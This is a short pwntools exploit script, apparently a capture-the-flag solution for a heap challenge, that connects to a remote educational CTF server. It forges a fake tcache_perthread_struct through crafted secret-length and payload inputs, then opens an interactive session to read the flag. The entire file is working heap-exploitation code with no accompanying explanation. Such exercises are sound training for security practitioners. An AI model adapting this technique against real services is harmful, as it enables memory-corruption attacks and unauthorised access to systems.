from pwn import *

context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

# io = gdb.debug("./market_bin_new", "b 55\nc")
io = remote("edu-ctf.zoolab.org", 30209)
io.sendlineafter(b"admin", b"n")
io.sendlineafter(b"name", b"peko")

# fake tcache_perthread_struct
fake = b"aa" * 64 + b"\xb0"  # 16 bytes before flag, because chunk->key will be set to zero
io.sendlineafter(b"long is your secret", str(0x280).encode())
io.sendafter(b"secret", fake)
io.sendlineafter(b"new secret", b"4")
io.sendlineafter(b"long", b"16")
io.sendafter(b"your secret", b"a" * 16)
io.sendlineafter(b"new secret", b"2")
io.interactive()
